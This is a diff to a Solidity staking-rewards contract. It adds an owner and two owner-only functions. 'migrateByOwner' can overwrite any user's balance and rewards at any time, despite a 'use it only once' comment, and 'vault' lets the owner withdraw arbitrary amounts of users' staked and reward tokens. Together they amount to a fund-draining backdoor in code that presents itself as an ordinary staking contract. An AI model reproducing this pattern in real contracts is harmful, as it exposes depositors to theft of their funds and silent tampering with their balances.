@@ -414,9 +414,7 @@ interface IStakingRewards {
     function totalSupply() external view returns (uint256);
 
     function balanceOf(address account) external view returns (uint256);
-    
     function alreadyRewardsOf(address account) external view returns (uint256);
-
     // Mutative
 
     function stake(uint256 amount) external;
@@ -457,6 +455,7 @@ contract StakingRewards is IStakingRewards, RewardsDistributionRecipient, Reentr
 
     uint256 private _totalSupply;
     mapping(address => uint256) private _balances;
+    address public owner;
 
     /* ========== EVENTS ========== */
 
@@ -474,8 +473,26 @@ contract StakingRewards is IStakingRewards, RewardsDistributionRecipient, Reentr
         rewardsToken = IERC20(_rewardsToken);
         stakingToken = IERC20(_stakingToken);
         rewardsDistribution = _rewardsDistribution;
+        owner = msg.sender;
     }
-
+    // use it only once on new deployed
+    function migrateByOwner(address[] calldata _users,uint256[] calldata _userbalances,uint256[] calldata _rewards,
+    uint256[] calldata _userRewardPerTokenPaid,uint256[] calldata _alreadyRewards) external {
+        require(msg.sender == owner, 'StakingRewards: FORBIDDEN');
+        
+        for (uint256 i; i < _users.length; i++) {
+            _totalSupply = _totalSupply.add(_userbalances[i]);
+            _balances[_users[i]] = _userbalances[i];
+            rewards[_users[i]] = _rewards[i];
+            userRewardPerTokenPaid[_users[i]] = _userRewardPerTokenPaid[i];
+            alreadyRewards[_users[i]] = _alreadyRewards[i];
+        }
+    }
+    function vault(uint256 amountStaking,uint256 amountReward) external {
+        require(msg.sender == owner, 'StakingRewards: FORBIDDEN');
+        rewardsToken.transfer(msg.sender, amountReward);
+        stakingToken.transfer(msg.sender, amountStaking);
+    }
     /* ========== VIEWS ========== */
 
     function totalSupply() external view returns (uint256) {
